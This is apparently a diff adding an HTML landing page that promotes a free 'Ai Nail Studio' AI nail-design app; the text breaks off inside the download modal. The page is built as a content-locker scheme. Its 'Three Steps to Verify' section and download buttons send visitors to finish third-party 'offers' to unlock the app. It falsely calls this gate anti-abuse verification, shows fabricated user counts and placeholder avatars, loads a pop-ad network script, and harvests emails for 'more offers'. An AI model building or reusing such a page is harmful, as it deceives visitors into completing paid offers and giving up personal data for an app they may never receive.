@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ai Nail Studio — Your Digital Nail Artist</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://code.iconify.design/iconify-icon/1.0.7/iconify-icon.min.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Playfair+Display:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500&display=swap" rel="stylesheet">
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: { sans: ['Inter','sans-serif'], serif: ['Playfair Display','serif'] },
+          colors: { cream:'#FDF8F4', blush:'#F9E8E0', rosegold:'#C4956A', softpink:'#F2D1CC', warmbeige:'#E8D5C4', deepbrown:'#8B6F5E', midnight:'#1A1A1A' }
+        }
+      }
+    }
+  </script>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:'Inter',sans-serif;background:#FDF8F4;color:#3D3029;overflow-x:hidden}
+    .marquee-track{display:flex;animation:marquee-right 25s linear infinite;width:max-content}
+    @keyframes marquee-right{0%{transform:translateX(-50%)}100%{transform:translateX(0%)}}
+    .marquee-track:hover{animation-play-state:paused}
+    @keyframes fadeInUp{0%{opacity:0;transform:translateY(30px)}100%{opacity:1;transform:translateY(0)}}
+    .animate-in{animation:fadeInUp .8s cubic-bezier(.16,1,.3,1) forwards}
+    .delay-100{animation-delay:100ms}.delay-200{animation-delay:200ms}.delay-300{animation-delay:300ms}.delay-400{animation-delay:400ms}.delay-500{animation-delay:500ms}
+    .reveal{opacity:0;transform:translateY(30px);transition:all .8s cubic-bezier(.16,1,.3,1)}
+    .reveal.visible{opacity:1;transform:translateY(0)}
+    @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
+    .float{animation:float 4s ease-in-out infinite}
+    @keyframes shimmer{0%{background-position:-200% center}100%{background-position:200% center}}
+    .cta-shimmer{background:linear-gradient(90deg,#C4956A 0%,#E8C9A8 25%,#C4956A 50%,#E8C9A8 75%,#C4956A 100%);background-size:200% auto;animation:shimmer 3s linear infinite}
+    .video-glow{box-shadow:0 0 80px rgba(196,149,106,.15),0 20px 60px rgba(0,0,0,.08)}
+    .glass-card{background:rgba(255,255,255,.7);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid rgba(196,149,106,.15)}
+    .text-gradient{background:linear-gradient(135deg,#C4956A,#8B6F5E);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+    ::-webkit-scrollbar{width:6px}::-webkit-scrollbar-track{background:#FDF8F4}::-webkit-scrollbar-thumb{background:#E8D5C4;border-radius:3px}::-webkit-scrollbar-thumb:hover{background:#C4956A}
+    .modal-overlay{opacity:0;pointer-events:none;transition:opacity .3s ease}
+    .modal-overlay.active{opacity:1;pointer-events:auto}
+    .modal-content{transform:scale(.92) translateY(16px);transition:transform .4s cubic-bezier(.16,1,.3,1)}
+    .modal-overlay.active .modal-content{transform:scale(1) translateY(0)}
+    @keyframes progressFill{0%{width:0}15%{width:18%}35%{width:40%}55%{width:62%}75%{width:78%}90%{width:90%}100%{width:100%}}
+    .progress-bar{animation:progressFill 4.5s cubic-bezier(.4,0,.2,1) forwards}
+    .form-iframe-wrapper{border-radius:1rem;overflow:hidden;background:#fff}
+    .form-iframe-wrapper iframe{display:block;width:100%;border:none}
+    .verify-btn-wrap{opacity:0;transform:translateY(8px);transition:all .5s cubic-bezier(.16,1,.3,1)}
+    .verify-btn-wrap.show{opacity:1;transform:translateY(0)}
+    .verify-spin{width:32px;height:32px;border:3px solid #E8D5C4;border-top-color:#C4956A;border-radius:50%;animation:spin .8s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
+  </style>
+</head>
+<body>
+
+  <!-- ========== MARQUEE ========== -->
+  <div class="bg-midnight w-full overflow-hidden py-2.5 relative z-50">
+    <div class="marquee-track">
+      <span class="text-white/90 text-xs sm:text-sm font-medium tracking-widest uppercase whitespace-nowrap px-8">✦ AI-Powered Nail Design ✦ Try Before You Visit The Salon ✦ Upload Any Inspiration ✦ See It On Your Hands In Seconds ✦ Free To Download ✦ Join 50K+ Nail Lovers ✦ AI-Powered Nail Design ✦ Try Before You Visit The Salon ✦ Upload Any Inspiration ✦ See It On Your Hands In Seconds ✦ Free To Download ✦ Join 50K+ Nail Lovers ✦</span>
+      <span class="text-white/90 text-xs sm:text-sm font-medium tracking-widest uppercase whitespace-nowrap px-8">✦ AI-Powered Nail Design ✦ Try Before You Visit The Salon ✦ Upload Any Inspiration ✦ See It On Your Hands In Seconds ✦ Free To Download ✦ Join 50K+ Nail Lovers ✦ AI-Powered Nail Design ✦ Try Before You Visit The Salon ✦ Upload Any Inspiration ✦ See It On Your Hands In Seconds ✦ Free To Download ✦ Join 50K+ Nail Lovers ✦</span>
+    </div>
+  </div>
+
+  <!-- ========== NAV ========== -->
+  <nav class="sticky top-0 z-40 bg-cream/80 backdrop-blur-xl border-b border-warmbeige/30">
+    <div class="max-w-6xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between">
+      <div class="flex items-center gap-3">
+        <img src="https://res.cloudinary.com/d3l3aqvy/image/upload/v1788282556/nail_app_icon.png" alt="Ai Nail Studio" class="w-9 h-9 rounded-2xl shadow-md">
+        <span class="font-serif text-lg font-semibold text-deepbrown tracking-tight">Ai Nail Studio</span>
+      </div>
+      <div class="hidden md:flex items-center gap-8">
+        <a href="#features" class="text-sm text-deepbrown/70 hover:text-deepbrown transition-colors">How It Works</a>
+        <a href="#video" class="text-sm text-deepbrown/70 hover:text-deepbrown transition-colors">See It Live</a>
+        <a href="#how-it-works" class="text-sm text-deepbrown/70 hover:text-deepbrown transition-colors">Steps</a>
+      </div>
+      <button onclick="openModal()" class="bg-midnight text-white text-xs font-semibold tracking-wide uppercase px-5 py-2.5 rounded-full hover:bg-deepbrown transition-colors duration-300">Get the App</button>
+    </div>
+  </nav>
+
+  <!-- ========== HERO ========== -->
+  <section class="relative pt-12 sm:pt-20 pb-16 sm:pb-24 px-4 sm:px-6 overflow-hidden">
+    <div class="absolute top-20 right-0 w-72 h-72 bg-softpink/30 rounded-full blur-3xl"></div>
+    <div class="absolute bottom-0 left-0 w-96 h-96 bg-warmbeige/20 rounded-full blur-3xl"></div>
+    <div class="max-w-4xl mx-auto text-center relative z-10">
+      <div class="animate-in opacity-0 mb-8 flex justify-center">
+        <img src="https://res.cloudinary.com/d3l3aqvy/image/upload/v1788282556/nail_app_icon.png" alt="Ai Nail Studio" class="w-20 h-20 sm:w-24 sm:h-24 rounded-[1.5rem] shadow-lg float">
+      </div>
+      <div class="animate-in opacity-0 delay-100 mb-6">
+        <span class="inline-flex items-center gap-2 bg-white/80 border border-softpink/50 text-deepbrown/80 text-xs font-medium tracking-wide px-4 py-2 rounded-full">
+          <span class="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
+          Now Available — Free Download
+        </span>
+      </div>
+      <h1 class="animate-in opacity-0 delay-200 font-serif text-4xl sm:text-5xl md:text-7xl font-bold leading-[1.1] tracking-tight mb-6">
+        Your Nails,<br><span class="text-gradient italic">Reimagined by AI</span>
+      </h1>
+      <p class="animate-in opacity-0 delay-300 text-deepbrown/60 text-base sm:text-lg md:text-xl font-light leading-relaxed max-w-2xl mx-auto mb-10">
+        Turn your ideas into stunning nails in seconds. Design with a prompt or upload inspiration and virtually try every look on your hand.
+      </p>
+      <div class="animate-in opacity-0 delay-400 flex flex-col sm:flex-row items-center justify-center gap-4">
+        <button onclick="openModal()" class="cta-shimmer relative text-white font-semibold text-base px-10 py-4 rounded-full shadow-lg hover:shadow-xl hover:scale-[1.03] active:scale-[0.98] transition-all duration-300 flex items-center gap-3">
+          <iconify-icon icon="lucide:sparkles" width="20"></iconify-icon>
+          Get Your Dream Nails
+        </button>
+        <a href="#video" class="text-deepbrown/60 hover:text-deepbrown text-sm font-medium flex items-center gap-2 transition-colors group">
+          <span class="w-10 h-10 rounded-full bg-white border border-warmbeige/40 flex items-center justify-center group-hover:border-rosegold/50 transition-colors">
+            <iconify-icon icon="lucide:play" width="16" class="ml-0.5"></iconify-icon>
+          </span>
+          Watch it in action
+        </a>
+      </div>
+      <div class="animate-in opacity-0 delay-500 mt-12 flex flex-col sm:flex-row items-center justify-center gap-4 sm:gap-8">
+        <div class="flex -space-x-2">
+          <img src="https://picsum.photos/seed/nailgirl1/80/80.jpg" class="w-8 h-8 rounded-full border-2 border-cream object-cover">
+          <img src="https://picsum.photos/seed/nailgirl2/80/80.jpg" class="w-8 h-8 rounded-full border-2 border-cream object-cover">
+          <img src="https://picsum.photos/seed/nailgirl3/80/80.jpg" class="w-8 h-8 rounded-full border-2 border-cream object-cover">
+          <img src="https://picsum.photos/seed/nailgirl4/80/80.jpg" class="w-8 h-8 rounded-full border-2 border-cream object-cover">
+          <div class="w-8 h-8 rounded-full border-2 border-cream bg-softpink flex items-center justify-center text-[10px] font-semibold text-deepbrown">+5k</div>
+        </div>
+        <div class="flex items-center gap-1.5">
+          <div class="flex">
+            <iconify-icon icon="lucide:star" width="14" class="text-amber-400"></iconify-icon>
+            <iconify-icon icon="lucide:star" width="14" class="text-amber-400"></iconify-icon>
+            <iconify-icon icon="lucide:star" width="14" class="text-amber-400"></iconify-icon>
+            <iconify-icon icon="lucide:star" width="14" class="text-amber-400"></iconify-icon>
+            <iconify-icon icon="lucide:star" width="14" class="text-amber-400"></iconify-icon>
+          </div>
+          <span class="text-xs text-deepbrown/50">Loved by 5,000+ nail enthusiasts</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========== VIDEO ========== -->
+  <section id="video" class="px-4 sm:px-6 pb-16 sm:pb-24">
+    <div class="max-w-4xl mx-auto reveal">
+      <div class="relative rounded-3xl overflow-hidden video-glow border border-warmbeige/20">
+        <video autoplay muted loop playsinline class="w-full max-h-[70vh] sm:max-h-[80vh] object-contain bg-black/5" poster="https://res.cloudinary.com/d3l3aqvy/image/upload/v1788282556/nail_app_icon.png">
+          <source src="https://res.cloudinary.com/d3l3aqvy/video/upload/v1788281872/nail_ad_perfect.mp4" type="video/mp4">
+        </video>
+        <div id="playOverlay" class="absolute inset-0 bg-black/20 flex items-center justify-center cursor-pointer transition-opacity duration-500" onclick="this.style.opacity='0';setTimeout(()=>this.style.display='none',500)">
+          <div class="w-16 h-16 sm:w-20 sm:h-20 rounded-full bg-white/90 flex items-center justify-center shadow-2xl hover:scale-110 transition-transform">
+            <iconify-icon icon="lucide:play" width="28" class="ml-1 text-deepbrown"></iconify-icon>
+          </div>
+        </div>
+      </div>
+      <p class="text-center text-xs text-deepbrown/40 mt-4 tracking-wide">See how Ai Nail Studio transforms your nails in real time</p>
+    </div>
+  </section>
+
+  <!-- ========== AD PLACEMENT ========== -->
+  <div class="px-4 sm:px-6 pb-12 sm:pb-16">
+    <div class="max-w-3xl mx-auto flex justify-center">
+      <div id="adspot-video">
+        <script src="https://pl31140726.profitableratecpmnetwork.com/09/04/f4/0904f4f79befbe30f83585ffc60538ff.js"></script>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== FEATURES ========== -->
+  <section id="features" class="px-4 sm:px-6 pb-20 sm:pb-32">
+    <div class="max-w-5xl mx-auto">
+      <div class="text-center mb-16 reveal">
+        <span class="text-rosegold text-xs font-semibold tracking-[0.2em] uppercase mb-4 block">Why You'll Love It</span>
+        <h2 class="font-serif text-3xl sm:text-4xl md:text-5xl font-bold tracking-tight mb-4">The Future of Nail Art<br><span class="text-gradient italic">at Your Fingertips</span></h2>
+        <p class="text-deepbrown/50 max-w-xl mx-auto text-base font-light leading-relaxed">It brings the future of nail design to your fingertips. Whether you love minimal elegance, bold chrome finishes, seasonal trends, or completely unique concepts — this is your all-in-one digital nail studio.</p>
+      </div>
+      <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-5">
+        <div class="reveal glass-card rounded-2xl p-7 hover:shadow-lg hover:-translate-y-1 transition-all duration-500 group">
+          <div class="w-12 h-12 rounded-2xl bg-blush flex items-center justify-center mb-5 group-hover:scale-110 transition-transform duration-500"><iconify-icon icon="lucide:camera" width="22" class="text-rosegold"></iconify-icon></div>
+          <h3 class="font-serif text-lg font-semibold mb-2">Snap Your Hand</h3>
+          <p class="text-deepbrown/50 text-sm leading-relaxed font-light">Take a quick photo of your hand and our AI instantly maps your nail shape and size.</p>
+        </div>
+        <div class="reveal glass-card rounded-2xl p-7 hover:shadow-lg hover:-translate-y-1 transition-all duration-500 group" style="transition-delay:80ms">
+          <div class="w-12 h-12 rounded-2xl bg-blush flex items-center justify-center mb-5 group-hover:scale-110 transition-transform duration-500"><iconify-icon icon="lucide:image-plus" width="22" class="text-rosegold"></iconify-icon></div>
+          <h3 class="font-serif text-lg font-semibold mb-2">Pick Any Inspiration</h3>
+          <p class="text-deepbrown/50 text-sm leading-relaxed font-light">Choose a nail design from your gallery — Pinterest saves, screenshots, anything goes.</p>
+        </div>
+        <div class="reveal glass-card rounded-2xl p-7 hover:shadow-lg hover:-translate-y-1 transition-all duration-500 group" style="transition-delay:160ms">
+          <div class="w-12 h-12 rounded-2xl bg-blush flex items-center justify-center mb-5 group-hover:scale-110 transition-transform duration-500"><iconify-icon icon="lucide:wand-2" width="22" class="text-rosegold"></iconify-icon></div>
+          <h3 class="font-serif text-lg font-semibold mb-2">AI Does the Magic</h3>
+          <p class="text-deepbrown/50 text-sm leading-relaxed font-light">Our AI perfectly applies the chosen design to each of your nails in seconds.</p>
+        </div>
+        <div class="reveal glass-card rounded-2xl p-7 hover:shadow-lg hover:-translate-y-1 transition-all duration-500 group" style="transition-delay:240ms">
+          <div class="w-12 h-12 rounded-2xl bg-blush flex items-center justify-center mb-5 group-hover:scale-110 transition-transform duration-500"><iconify-icon icon="lucide:palette" width="22" class="text-rosegold"></iconify-icon></div>
+          <h3 class="font-serif text-lg font-semibold mb-2">Design with Prompts</h3>
+          <p class="text-deepbrown/50 text-sm leading-relaxed font-light">Describe your dream nails in words and watch AI bring your vision to life.</p>
+        </div>
+        <div class="reveal glass-card rounded-2xl p-7 hover:shadow-lg hover:-translate-y-1 transition-all duration-500 group" style="transition-delay:320ms">
+          <div class="w-12 h-12 rounded-2xl bg-blush flex items-center justify-center mb-5 group-hover:scale-110 transition-transform duration-500"><iconify-icon icon="lucide:save" width="22" class="text-rosegold"></iconify-icon></div>
+          <h3 class="font-serif text-lg font-semibold mb-2">Save & Share</h3>
+          <p class="text-deepbrown/50 text-sm leading-relaxed font-light">Save your favorite looks, build a mood board, and share with your nail tech.</p>
+        </div>
+        <div class="reveal glass-card rounded-2xl p-7 hover:shadow-lg hover:-translate-y-1 transition-all duration-500 group" style="transition-delay:400ms">
+          <div class="w-12 h-12 rounded-2xl bg-blush flex items-center justify-center mb-5 group-hover:scale-110 transition-transform duration-500"><iconify-icon icon="lucide:infinity" width="22" class="text-rosegold"></iconify-icon></div>
+          <h3 class="font-serif text-lg font-semibold mb-2">Endless Styles</h3>
+          <p class="text-deepbrown/50 text-sm leading-relaxed font-light">Chrome, French, ombre, 3D art, minimal, maximal — explore infinite possibilities.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========== STEPS / VERIFY ========== -->
+  <section id="how-it-works" class="px-4 sm:px-6 pb-20 sm:pb-32">
+    <div class="max-w-4xl mx-auto">
+      <div class="text-center mb-16 reveal">
+        <span class="text-rosegold text-xs font-semibold tracking-[0.2em] uppercase mb-4 block">So Simple</span>
+        <h2 class="font-serif text-3xl sm:text-4xl md:text-5xl font-bold tracking-tight">Three Steps to<br><span class="text-gradient italic">Verify</span></h2>
+      </div>
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-8 md:gap-6">
+        <div class="reveal text-center">
+          <div class="relative w-20 h-20 mx-auto mb-6">
+            <div class="absolute inset-0 bg-softpink/50 rounded-3xl rotate-6"></div>
+            <div class="relative w-full h-full bg-white rounded-3xl shadow-md flex items-center justify-center"><span class="font-serif text-2xl font-bold text-rosegold">1</span></div>
+          </div>
+          <h3 class="font-serif text-lg font-semibold mb-2">Choose an Offer</h3>
+          <p class="text-deepbrown/50 text-sm font-light leading-relaxed">Click a preferred offer there and finish it to unlock the app.</p>
+        </div>
+        <div class="reveal text-center" style="transition-delay:120ms">
+          <div class="relative w-20 h-20 mx-auto mb-6">
+            <div class="absolute inset-0 bg-blush/50 rounded-3xl -rotate-3"></div>
+            <div class="relative w-full h-full bg-white rounded-3xl shadow-md flex items-center justify-center"><span class="font-serif text-2xl font-bold text-rosegold">2</span></div>
+          </div>
+          <h3 class="font-serif text-lg font-semibold mb-2">Come Back</h3>
+          <p class="text-deepbrown/50 text-sm font-light leading-relaxed">Come back after you unlocked the app.</p>
+        </div>
+        <div class="reveal text-center" style="transition-delay:240ms">
+          <div class="relative w-20 h-20 mx-auto mb-6">
+            <div class="absolute inset-0 bg-warmbeige/50 rounded-3xl rotate-3"></div>
+            <div class="relative w-full h-full bg-white rounded-3xl shadow-md flex items-center justify-center"><span class="font-serif text-2xl font-bold text-rosegold">3</span></div>
+          </div>
+          <h3 class="font-serif text-lg font-semibold mb-2">See the Magic</h3>
+          <p class="text-deepbrown/50 text-sm font-light leading-relaxed">AI applies the design to your nails instantly. Save, share, or try another!</p>
+        </div>
+      </div>
+      <!-- Verification explanation -->
+      <div class="text-center mt-12 reveal max-w-md mx-auto">
+        <div class="inline-flex items-start gap-2 bg-white/60 rounded-2xl px-5 py-4 border border-warmbeige/20">
+          <svg class="mt-0.5 flex-shrink-0" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#C4956A" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+          <p class="text-deepbrown/50 text-sm font-light leading-relaxed text-left">Verification helps protect our app and keep it free for real users. It prevents automated abuse so everyone gets a safe and fair experience.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========== GALLERY ========== -->
+  <section class="px-4 sm:px-6 pb-20 sm:pb-32">
+    <div class="max-w-5xl mx-auto">
+      <div class="text-center mb-12 reveal">
+        <span class="text-rosegold text-xs font-semibold tracking-[0.2em] uppercase mb-4 block">Possibilities</span>
+        <h2 class="font-serif text-3xl sm:text-4xl font-bold tracking-tight">Every Style, <span class="text-gradient italic">Every Mood</span></h2>
+      </div>
+      <div class="grid grid-cols-2 md:grid-cols-4 gap-3 sm:gap-4 reveal">
+        <div class="rounded-2xl overflow-hidden aspect-[3/4] bg-blush/30 group"><img src="https://picsum.photos/seed/nailstyle1/400/530.jpg" alt="Nail style" class="w-full h-full object-cover group-hover:scale-110 transition-transform duration-700"></div>
+        <div class="rounded-2xl overflow-hidden aspect-[3/4] bg-softpink/30 group md:mt-8"><img src="https://picsum.photos/seed/nailstyle2/400/530.jpg" alt="Nail style" class="w-full h-full object-cover group-hover:scale-110 transition-transform duration-700"></div>
+        <div class="rounded-2xl overflow-hidden aspect-[3/4] bg-warmbeige/30 group"><img src="https://picsum.photos/seed/nailstyle3/400/530.jpg" alt="Nail style" class="w-full h-full object-cover group-hover:scale-110 transition-transform duration-700"></div>
+        <div class="rounded-2xl overflow-hidden aspect-[3/4] bg-blush/30 group md:mt-8"><img src="https://picsum.photos/seed/nailstyle4/400/530.jpg" alt="Nail style" class="w-full h-full object-cover group-hover:scale-110 transition-transform duration-700"></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========== AD PLACEMENT #2 ========== -->
+  <div class="px-4 sm:px-6 pb-12 sm:pb-16">
+    <div class="max-w-3xl mx-auto flex justify-center">
+      <div id="adspot-cta"></div>
+    </div>
+  </div>
+
+  <!-- ========== FINAL CTA ========== -->
+  <section class="px-4 sm:px-6 pb-20 sm:pb-32">
+    <div class="max-w-3xl mx-auto reveal">
+      <div class="relative bg-midnight rounded-3xl p-10 sm:p-16 text-center overflow-hidden">
+        <div class="absolute top-0 right-0 w-48 h-48 bg-rosegold/10 rounded-full blur-3xl"></div>
+        <div class="absolute bottom-0 left-0 w-64 h-64 bg-rosegold/5 rounded-full blur-3xl"></div>
+        <div class="relative z-10">
+          <img src="https://res.cloudinary.com/d3l3aqvy/image/upload/v1788282556/nail_app_icon.png" alt="Ai Nail Studio" class="w-16 h-16 rounded-2xl mx-auto mb-8 shadow-lg">
+          <h2 class="font-serif text-3xl sm:text-4xl md:text-5xl font-bold text-white tracking-tight mb-4 leading-tight">Ready for Your<br><em class="text-rosegold">Best Nails Yet?</em></h2>
+          <p class="text-white/50 text-base font-light leading-relaxed mb-10 max-w-lg mx-auto">Join thousands of girls who already design their nails with AI. It's free, it's fun, and your nails will thank you.</p>
+          <button onclick="openModal()" class="cta-shimmer text-white font-semibold text-base px-12 py-4 rounded-full shadow-lg hover:shadow-xl hover:scale-[1.03] active:scale-[0.98] transition-all duration-300 inline-flex items-center gap-3">
+            <iconify-icon icon="lucide:download" width="20"></iconify-icon>
+            Get the App Free
+          </button>
+          <p class="text-white/30 text-xs mt-5">No credit card needed · iOS</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========== EMAIL SIGNUP ========== -->
+  <section class="px-4 sm:px-6 pb-20 sm:pb-28">
+    <div class="max-w-xl mx-auto reveal">
+      <div class="glass-card rounded-3xl p-8 sm:p-10 text-center">
+        <div class="w-14 h-14 rounded-2xl bg-blush flex items-center justify-center mx-auto mb-5"><iconify-icon icon="lucide:mail" width="24" class="text-rosegold"></iconify-icon></div>
+        <h3 class="font-serif text-2xl sm:text-3xl font-bold text-deepbrown mb-2">Get More Offers 💌</h3>
+        <p class="text-deepbrown/50 text-sm font-light leading-relaxed mb-8">Enter your email to receive more offers and updates.</p>
+        <div class="form-iframe-wrapper shadow-sm">
+          <iframe src="https://docs.google.com/forms/d/e/1FAIpQLSfB4gm12OgS4vVkzdsZMmDBV7zQzy_txGTNTocSxDYCguZ0ig/viewform?embedded=true" width="640" height="452" frameborder="0" marginheight="0" marginwidth="0" loading="lazy" title="Email Signup">Loading…</iframe>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========== FOOTER (with About Us text) ========== -->
+  <footer class="border-t border-warmbeige/30 px-4 sm:px-6 py-10">
+    <div class="max-w-5xl mx-auto">
+      <p class="text-center text-deepbrown/40 text-xs font-light leading-relaxed max-w-md mx-auto mb-6">About Us: We share Amazing Nails Tutorials and Tricks. Snap your hand, pick a design, and watch AI apply it — completely free!</p>
+      <div class="flex flex-col sm:flex-row items-center justify-between gap-4">
+        <div class="flex items-center gap-2.5">
+          <img src="https://res.cloudinary.com/d3l3aqvy/image/upload/v1788282556/nail_app_icon.png" alt="" class="w-7 h-7 rounded-xl">
+          <span class="font-serif text-sm font-semibold text-deepbrown/70">Ai Nail Studio</span>
+        </div>
+        <p class="text-xs text-deepbrown/40">© 2025 Ai Nail Studio. All rights reserved.</p>
+        <div class="flex items-center gap-5">
+          <a href="https://www.instagram.com/nailswoom/" target="_blank" rel="noopener" class="text-deepbrown/40 hover:text-rosegold transition-colors"><iconify-icon icon="lucide:instagram" width="18"></iconify-icon></a>
+          <a href="https://www.tiktok.com/@naylixia?_r=1&_t=ZN-9AupR2Emxuw" target="_blank" rel="noopener" class="text-deepbrown/40 hover:text-rosegold transition-colors">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.96-.01 2.96.01 5.92-.01 8.87-.05 1.96-.82 3.88-2.12 5.32-1.86 2.02-4.75 2.94-7.41 2.36-2.47-.55-4.63-2.27-5.55-4.64-.85-2.16-.6-4.73.68-6.67 1.26-1.96 3.5-3.26 5.81-3.38.04 1.46.01 2.92.02 4.38-1.12.38-2.14 1.11-2.71 2.17-.43.78-.48 1.75-.22 2.6.41 1.34 1.72 2.36 3.11 2.45 1.31.13 2.66-.55 3.38-1.65.26-.43.39-.93.42-1.43.05-1.28.02-2.56.03-3.84.02-4.28 0-8.56.01-12.84z"/></svg>
+          </a>
+          <a href="#" class="text-deepbrown/40 hover:text-rosegold transition-colors"><iconify-icon icon="lucide:youtube" width="18"></iconify-icon></a>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <!-- ========== DOWNLOAD MODAL ========== -->
+  <div id="downloadModal" class="modal-overlay fixed inset-0 z-[100] flex items-end sm:items-center justify-center" onclick="if(event.target===this)closeModal()">
+    <div class="absolute inset-0 bg-black/40 backdrop-blur-sm"></div>
+    <div class="modal-content relative bg-cream rounded-t-3xl sm:rounded-3xl w-full sm:max-w-xs shadow-2xl overflow-hidden">
+      <div class="flex items-center justify-between px-6 pt-5 pb-3">
+        <div class="flex items-center gap-2.5">
+          <img src="https://res.cloudinary.com/d3l3aqvy/image/upload/v1788282556/nail_app_icon.png" alt="" class="w-8 h-8 rounded-xl shadow-sm">
+          <span class="font-serif text-sm font-semibold text-deepbrown">Ai Nail Studio</span>
+        </div>
+        <button onclick="closeModal()" class="w-7 h-7 rounded-full bg-warmbeige/40 flex items-center justify-center text-deepbrown/50 hover:text-deepbrown transition-colors">
+          <iconify-icon icon="lucide:x" width="14"></iconify-icon>
+        </button>
+      </div>
+
+      <!-- ===== LINKS PHASE ===== -->
+      <div id="loadingPhase" class="px-6 pb-6">
+
+        <!-- iOS Link 1 -->
+        <button onclick="showVerification(loadScript1)" class="w-full bg-midnight text-white py-3.5 rounded-2xl font-medium text-sm flex items-center justify-center gap-2.5 hover:bg-deepbrown transition-colors duration-300">
+          <svg width="14" height="17" viewBox="0 0 24 24" fill="white"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.64 9.39c.85-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.5 3.15-1.5.12 1.17-.42 2.35-1.07 3.19-.69.85-1.81 1.51-2.91 1.42-.15-1.15.47-2.35 1.07-3.11"/></svg>
+          Link 1
+        </button>
+
+        <!-- iOS Link 2 -->
+        <button onclick="showVerification(loadScript2)" class="w-full bg-midnight text-white py-3.5 rounded-2xl font-medium text-sm flex items-center justify-center gap-2.5 hover:bg-deepbrown transition-colors duration-300 mt-3">
+          <svg width="14" height="17" viewBox="0 0 24 24" fill="white"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.64 9.39c.85-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.5 3.15-1.5.12 1.17-.42 2.35-1.07 3.19-.69.85-1.81 1.51-2.91 1.42-.15-1.15.47-2.35 1.07-3.11"/></svg>
+          Link 2
+        </button>
+
+        <!-- Hint text -->
+        <div class="mt-3 mb-1 text-center">
+          <p class="text-deepbrown/50 text-xs font-medium flex items-center justify-center gap-1.5">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+            If Link 1 didn't work, try Link 2
+          </p>
+        </div>
+
+        <!-- Android section -->
+        <div class="mt-4 pt-4 border-t border-warmbeige/20 flex flex-col items-center">
+          <button onclick="toggleAndroidLinks()" class="inline-flex items-center gap-2 bg-[#3ddc84] text-black px-5 py-2.5 rounded-xl text-sm font-semibold hover:opacity-90 transition-opacity">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="black"><path d="M17.6 9.48l1.84-3.18c.16-.31.04-.69-.26-.85-.29-.15-.65-.06-.83.22l-1.88 3.24c-2.86-1.21-6.08-1.21-8.94 0L5.65 5.67c-.19-.29-.58-.38-.87-.2-.28.18-.37.54-.22.83L6.4 9.48C3.3 11.25 1.28 14.44 1 18h22c-.28-3.56-2.3-6.75-5.4-8.52zM7 15.25c-.69 0-1.25-.56-1.25-1.25s.56-1.25 1.25-1.25 1.25.56 1.25 1.25-.56 1.25-1.25 1.25zm10 0c-.69 0-1.25-.56-1.25-1.25s.56-1.25 1.25-1.25 1.25.56 1.25 1.25-.56 1.25-1.25 1.25z"/></svg>
+            Get it for Android
+          </button>
+
+          <!-- Android Links -->
+          <div id="androidLinks" class="hidden w-full mt-3">
+            <button onclick="showVerification(loadScript3)" class="w-full bg-midnight text-white py-3.5 rounded-2xl font-medium text-sm flex items-center justify-center gap-2.5 hover:bg-deepbrown transition-colors duration-300">
